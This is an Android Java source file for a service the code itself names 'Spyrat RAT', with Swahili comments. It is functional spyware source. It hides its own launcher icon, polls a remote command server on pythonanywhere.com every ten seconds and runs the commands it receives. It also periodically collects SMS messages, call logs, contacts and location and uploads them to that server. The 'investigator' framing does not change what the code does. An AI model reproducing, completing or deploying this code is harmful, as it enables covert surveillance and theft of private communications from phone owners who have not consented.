package com.spyrat.investigation;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONObject;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "SpyratRAT";
    private Timer commandTimer;
    private Timer dataTimer;
    private String investigatorCode = "INVESTIGATOR_001";
    private String deviceId;

    // API URLs - ZIMEBORESHWAA
    private final String DATA_URL = "https://GhostTester.pythonanywhere.com/api/investigator/data";
    private final String COMMANDS_URL = "https://GhostTester.pythonanywhere.com/api/investigator/commands";
    private final String HEARTBEAT_URL = "https://GhostTester.pythonanywhere.com/api/investigator/heartbeat";
    private final String COMMAND_RESULT_URL = "https://GhostTester.pythonanywhere.com/api/investigator/command-result";
    private final String UPLOAD_FILE_URL = "https://GhostTester.pythonanywhere.com/api/investigator/upload-file";

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = android.os.Build.SERIAL;
        Log.d(TAG, "🚀 Spyrat RAT Service Started - Device: " + deviceId);

        // Ficha app icon automatikali
        hideAppIcon();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startCommandLoop();
        startDataCollection();
        startHeartbeat();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void hideAppIcon() {
        try {
            // Ficha icon kwenye launcher
            PackageManager pm = getPackageManager();
            ComponentName component = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.d(TAG, "✅ App icon imefichika");
        } catch (Exception e) {
            Log.e(TAG, "❌ Error hiding icon: " + e.getMessage());
        }
    }

    private void startCommandLoop() {
        commandTimer = new Timer();
        // Check commands kila sekunde 10
        commandTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!investigatorCode.isEmpty()) {
                    checkForCommands();
                }
            }
        }, 0, 10000);

        Log.d(TAG, "🔄 Command loop imeanzishwa");
    }

    private void startDataCollection() {
        dataTimer = new Timer();
        // Collect data kila dakika 2
        dataTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!investigatorCode.isEmpty()) {
                    collectAllData();
                }
            }
        }, 0, 120000);
    }

    private void startHeartbeat() {
        Timer heartbeatTimer = new Timer();
        // Send heartbeat kila dakika 5
        heartbeatTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!investigatorCode.isEmpty()) {
                    sendHeartbeat();
                }
            }
        }, 0, 300000);
    }

    private void checkForCommands() {
        try {
            String url = COMMANDS_URL + "?device_id=" + deviceId + "&investigator_code=" + investigatorCode;
            String response = NetworkManager.sendGet(url);

            if (response != null) {
                JSONObject jsonResponse = new JSONObject(response);
                if (jsonResponse.has("commands")) {
                    CommandExecutor.executeCommands(jsonResponse.getJSONArray("commands"), this);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command check error: " + e.getMessage());
        }
    }

    private void collectAllData() {
        try {
            Log.d(TAG, "🔄 Inaanza ukusaji wa data...");

            // 1. Kusanya SMS
            if (PermissionManager.hasSMSPermission(this)) {
                SMSCapture.collectAndSendSMS(this, deviceId, investigatorCode);
            }

            // 2. Kusanya Call Log
            if (PermissionManager.hasCallLogPermission(this)) {
                CallMonitor.collectAndSendCalls(this, deviceId, investigatorCode);
            }

            // 3. Kusanya Contacts
            if (PermissionManager.hasContactsPermission(this)) {
                ContactGrabber.collectAndSendContacts(this, deviceId, investigatorCode);
            }

            // 4. Kusanya Location
            if (PermissionManager.hasLocationPermission(this)) {
                LocationTracker.sendCurrentLocation(this, deviceId, investigatorCode);
            }

            // 5. Kusanya Device Info
        // DeviceInfoCollector.sendDeviceInfo(this, deviceId, investigatorCode); // TEMP: Disabled for build

            Log.d(TAG, "✅ Ukusaji wa data umekamilika");

        } catch (Exception e) {
            Log.e(TAG, "❌ Data collection error: " + e.getMessage());
        }
    }

    private void sendHeartbeat() {
        try {
            JSONObject heartbeat = new JSONObject();
            heartbeat.put("device_id", deviceId);
            heartbeat.put("investigator_code", investigatorCode);
            heartbeat.put("status", "online");
            heartbeat.put("battery_level", getBatteryLevel());
            heartbeat.put("timestamp", System.currentTimeMillis());

            // Add location if available
            if (PermissionManager.hasLocationPermission(this)) {
                JSONObject location = LocationTracker.getCurrentLocation(this);
                if (location != null) {
                    heartbeat.put("location", location);
                }
            }

            String response = NetworkManager.sendPost(HEARTBEAT_URL, heartbeat.toString());
            if (response != null) {
                Log.d(TAG, "💓 Heartbeat sent successfully");
            } else {
                Log.e(TAG, "❌ Heartbeat failed");
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Heartbeat error: " + e.getMessage());
        }
    }

    private int getBatteryLevel() {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) {
            Log.e(TAG, "❌ Battery level error: " + e.getMessage());
            return -1;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (commandTimer != null) {
            commandTimer.cancel();
        }
        if (dataTimer != null) {
            dataTimer.cancel();
        }
        Log.d(TAG, "♻️ Service imefutwa");
    }
}
